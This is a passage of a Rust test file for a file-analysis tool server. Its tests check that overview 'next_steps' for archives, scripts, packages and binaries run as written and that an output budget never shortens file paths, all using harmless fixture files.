    let dir = TempDir::new().unwrap();
    for (name, entries) in [
        (
            "app.war",
            vec![("WEB-INF/web.xml", &b"<web-app/>"[..]), ("a.jsp", b"x")],
        ),
        (
            "app.ear",
            vec![("META-INF/application.xml", b"<application/>")],
        ),
        ("web.zip", vec![("WEB-INF/web.xml", b"<web-app/>")]),
        ("plain.zip", vec![("a.txt", b"hello")]),
    ] {
        let path = dir.path().join(name);
        write_zip(&path, &entries);
        let (overview, _) = harness.ok("analyze_file", json!({"file_path": path})).await;
        let tools: Vec<&str> = overview["next_steps"]
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|s| s["tool"].as_str())
            .collect();
        assert!(!tools.contains(&"disassemble"), "{name}: {tools:?}");
        assert!(
            !overview["next_steps"].to_string().contains("\"symbols\""),
            "{name}: {overview}"
        );
        if name == "plain.zip" {
            assert_eq!(overview["kind"], "zip", "{overview}");
            assert!(!tools.contains(&"analyze_java_file"), "{tools:?}");
        } else {
            assert_eq!(overview["kind"], "jar", "{name}: {overview}");
            assert!(tools.contains(&"analyze_java_file"), "{name}: {tools:?}");
        }
        for step in overview["next_steps"].as_array().unwrap() {
            assert!(
                step["gives"].is_string() && step.get("why").is_none(),
                "{step}"
            );
        }
    }
}

/// The function-list step runs as written even when the first row's name is
/// shared by several functions, and a decimal address works as `function`.
#[tokio::test]
async fn the_function_list_step_runs_when_names_repeat_and_decimal_addresses_work() {
    let harness = Harness::new().await;
    let file = sample("go_test_binary");
    for offset in [0, 1, 2] {
        let (table, _) = harness
            .ok(
                "disassemble",
                json!({"file_path": file, "filter": "(.text)", "offset": offset, "limit": 3}),
            )
            .await;
        let step = &table["next_steps"][0];
        assert_eq!(step["tool"], "disassemble", "{table}");
        harness.ok("disassemble", step["arguments"].clone()).await;
    }
    let (by_hex, _) = harness
        .ok(
            "disassemble",
            json!({"file_path": file, "function": "0x401136", "max_instructions": 3}),
        )
        .await;
    let (by_decimal, _) = harness
        .ok(
            "disassemble",
            json!({"file_path": file, "function": "4198710", "max_instructions": 3}),
        )
        .await;
    assert_eq!(by_hex["listing"], by_decimal["listing"], "{by_decimal}");
}

// ---------------------------------------------------------------------------
// Round 8: overview steps that run, and a budget that never shortens a path
// ---------------------------------------------------------------------------

/// Tool names of an answer's `next_steps`.
fn step_tools(answer: &Value) -> Vec<&str> {
    answer["next_steps"]
        .as_array()
        .map(|steps| steps.iter().filter_map(|s| s["tool"].as_str()).collect())
        .unwrap_or_default()
}

fn write_tgz(path: &std::path::Path) {
    let mut tar = Vec::new();
    {
        let mut builder = tar::Builder::new(&mut tar);
        let data = b"{\"name\":\"x\",\"version\":\"1.0.0\"}";
        let mut header = tar::Header::new_gnu();
        header.set_size(data.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        builder
            .append_data(&mut header, "package/package.json", &data[..])
            .unwrap();
        builder.finish().unwrap();
    }
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    std::io::Write::write_all(&mut encoder, &tar).unwrap();
    std::fs::write(path, encoder.finish().unwrap()).unwrap();
}

/// analyze_script refuses a language it has no rules for, so the overview of a
/// Perl, Ruby or PHP script (extension or `#!` line) does not offer it.
#[tokio::test]
async fn the_overview_offers_analyze_script_only_for_languages_it_reads() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let write = |name: &str, body: &str| {
        let path = dir.path().join(name);
        std::fs::write(&path, body).unwrap();
        path
    };
    for (name, body) in [
        ("fetch.pl", "#!/usr/bin/perl\nprint 1;\n"),
        ("noext_perl", "#!/usr/bin/env perl\nprint 1;\n"),
        ("r.rb", "puts 1\n"),
        ("p.php", "<?php echo 1; ?>\n"),
    ] {
        let path = write(name, body);
        let (overview, _) = harness.ok("analyze_file", json!({"file_path": path})).await;
        assert_eq!(overview["kind"], "script", "{name}: {overview}");
        assert!(
            !step_tools(&overview).contains(&"analyze_script"),
            "{name}: {overview}"
        );
    }
    for (name, body) in [
        ("a.sh", "#!/bin/sh\necho 1\n"),
        ("a.py", "print(1)\n"),
        ("a.js", "console.log(1)\n"),
        ("a.ps1", "Write-Host 1\n"),
        ("a.bat", "@echo off\n"),
        ("a.vbs", "WScript.Echo 1\n"),
    ] {
        let path = write(name, body);
        let (overview, _) = harness.ok("analyze_file", json!({"file_path": path})).await;
        let tools = step_tools(&overview);
        assert_eq!(tools[0], "analyze_script", "{name}: {overview}");
        // The step runs as written.
        let step = &overview["next_steps"][0];
        let (_, _) = harness
            .ok("analyze_script", step["arguments"].clone())
            .await;
    }
}

/// A zip whose central directory cannot be read does not offer the listing
/// that would fail; a readable one still does.
#[tokio::test]
async fn the_overview_leaves_out_inspect_archive_for_an_unreadable_archive() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let garbage = dir.path().join("garbage.zip");
    let mut bytes = b"PK\x03\x04".to_vec();
    bytes.extend_from_slice(&[7u8; 200]);
    std::fs::write(&garbage, bytes).unwrap();
    let (overview, _) = harness
        .ok("analyze_file", json!({"file_path": garbage}))
        .await;
    assert!(
        overview["format_details"]["archive"]["error"].is_string(),
        "{overview}"
    );
    assert!(
        !step_tools(&overview).contains(&"inspect_archive"),
        "{overview}"
    );

    let good = dir.path().join("good.zip");
    {
        let mut zip = zip::write::ZipWriter::new(std::fs::File::create(&good).unwrap());
        zip.start_file("a.txt", zip::write::SimpleFileOptions::default())
            .unwrap();
        std::io::Write::write_all(&mut zip, b"hello").unwrap();
        zip.finish().unwrap();
    }
    let (overview, _) = harness.ok("analyze_file", json!({"file_path": good})).await;
    assert_eq!(step_tools(&overview)[0], "inspect_archive", "{overview}");
}

/// A Java archive has no symbol table: the overview carries no note about one.
#[tokio::test]
async fn the_overview_of_a_java_archive_has_no_symbols_note() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    for name in ["a.jar", "a.war", "a.ear", "a.aar"] {
        let path = dir.path().join(name);
        let mut zip = zip::write::ZipWriter::new(std::fs::File::create(&path).unwrap());
        let opts = zip::write::SimpleFileOptions::default();
        zip.start_file("META-INF/MANIFEST.MF", opts).unwrap();
        std::io::Write::write_all(&mut zip, b"Manifest-Version: 1.0\n").unwrap();
        zip.start_file("A.class", opts).unwrap();
        std::io::Write::write_all(&mut zip, &[0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 0x34, 0, 1])
            .unwrap();
        zip.finish().unwrap();
        let (overview, _) = harness.ok("analyze_file", json!({"file_path": path})).await;
        assert!(
            overview["notes"].get("symbols").is_none(),
            "{name}: {overview}"
        );
        assert!(!overview.to_string().contains("symbol analysis"), "{name}");
        assert!(
            step_tools(&overview).contains(&"analyze_java_file"),
            "{name}"
        );
    }
}

/// A .tgz can be an npm package or a Python sdist, like a .tar.gz.
#[tokio::test]
async fn the_overview_of_a_tgz_offers_both_package_tools_like_a_tar_gz() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let mut gives = Vec::new();
    for name in ["pkg-1.0.tgz", "pkg-1.0.tar.gz"] {
        let path = dir.path().join(name);
        write_tgz(&path);
        let (overview, _) = harness.ok("analyze_file", json!({"file_path": path})).await;
        let tools = step_tools(&overview);
        assert!(tools.contains(&"analyze_npm_package"), "{name}: {tools:?}");
        assert!(
            tools.contains(&"analyze_python_package"),
            "{name}: {tools:?}"
        );
        gives.push(
            overview["next_steps"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|s| s["tool"].as_str().is_some_and(|t| t.ends_with("_package")))
                .map(|s| s["gives"].clone())
                .collect::<Vec<_>>(),
        );
    }
    assert_eq!(gives[0], gives[1]);
}

/// The overview names the disassemble tool's real reach: PE as well.
#[tokio::test]
async fn the_disassemble_description_names_pe() {
    let harness = Harness::new().await;
    let tools = harness.client.list_all_tools().await.unwrap();
    let tool = tools.iter().find(|t| t.name == "disassemble").unwrap();
    let text = tool.description.as_deref().unwrap_or_default();
    assert!(text.contains("PE"), "{text}");
}

/// Section-answer steps carry the caller's spelling of `arch`.
#[tokio::test]
async fn section_next_steps_spell_a_slice_arch_the_way_the_overview_does() {
    let harness = Harness::new().await;
    let dir = TempDir::new().unwrap();
    let three = dir.path().join("three.bin");
    std::fs::write(
        &three,
        fat_macho(&[(0x0100_0007, 3), (0x0100_000c, 2), (0x0100_000c, 12)]),
    )
    .unwrap();
    for arch in ["arm64-subtype-12", "ARM64 (subtype 12)"] {
        let (answer, _) = harness
            .ok(
                "analyze_file",
                json!({"file_path": three, "sections": ["binary_info"], "arch": arch}),
            )
            .await;
        let steps = answer["next_steps"].as_array().unwrap();
        assert!(!steps.is_empty(), "{answer}");
        for step in steps {
            if let Some(got) = step["arguments"].get("arch") {
                assert_eq!(got, "arm64-subtype-12", "{arch}: {step}");
            }
        }
    }
}

/// At the smallest budget a path of 240 or 1000 bytes is never shortened, in
/// a step or in the echo: a step is kept whole or dropped and counted.
#[tokio::test]
async fn the_budget_never_shortens_a_path_in_a_next_step() {
    let harness = Harness::new().await;
    let root = TempDir::new().unwrap();
    for target in [240usize, 1000] {
        let mut dir = root.path().to_path_buf();
        let mut left = target.saturating_sub(dir.to_string_lossy().len() + 16);
        while left > 0 {
            let k = left.min(200);
            dir.push("d".repeat(k));
            left = left.saturating_sub(k + 1);
        }
        std::fs::create_dir_all(&dir).unwrap();
        let mut cases: Vec<(&str, &str, String)> = Vec::new();
        let tgz = dir.join("pkg-1.0.tgz");
        write_tgz(&tgz);
        let sh = dir.join("run.sh");
        std::fs::write(&sh, "#!/bin/sh\necho hi\n").unwrap();
        let jar = dir.join("a.jar");
        {
            let mut zip = zip::write::ZipWriter::new(std::fs::File::create(&jar).unwrap());
            zip.start_file("A.class", zip::write::SimpleFileOptions::default())
                .unwrap();
            std::io::Write::write_all(&mut zip, &[0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 0x34, 0, 1])
                .unwrap();
            zip.finish().unwrap();
        }
        let bin = dir.join("c_advanced_binary");
        std::fs::copy(sample("c_advanced_binary"), &bin).unwrap();
        for (tool, key, file) in [
            ("analyze_file", "file_path", &sh),
            ("analyze_file", "file_path", &tgz),
            ("analyze_file", "file_path", &bin),
            ("analyze_java_file", "file_path", &jar),
            ("analyze_npm_package", "package_path", &tgz),
            ("analyze_python_package", "package_path", &tgz),
            ("analyze_script", "file_path", &sh),
            ("inspect_archive", "file_path", &jar),
            ("disassemble", "file_path", &bin),
            ("query_analysis", "file_path", &bin),
        ] {
            cases.push((tool, key, file.to_string_lossy().into_owned()));
        }
        for (tool, key, path) in cases {
            let mut args = json!({ key: path, "max_output_bytes": 4000 });
            if tool == "query_analysis" {
                args["section"] = "strings".into();
            }
            let result = harness.raw(tool, args.clone()).await;
            let text = result.content[0].as_text().unwrap().text.clone();
            if result.is_error == Some(true) {
                continue;
            }
            assert!(text.len() <= 4000, "{tool} {target}: {} bytes", text.len());
            let answer: Value = serde_json::from_str(&text).unwrap();
            for step in answer["next_steps"].as_array().into_iter().flatten() {
                for (name, value) in step["arguments"].as_object().unwrap() {
                    if name == "file_path" || name == "package_path" {
                        assert_eq!(value, &Value::String(path.clone()), "{tool}: {step}");
                    }
                }
            }
            for echo in ["file_path", "package_path"] {
                if let Some(got) = answer.get(echo) {
                    assert_eq!(got, &Value::String(path.clone()), "{tool} {echo}");
                }
            }
        }
    }
}
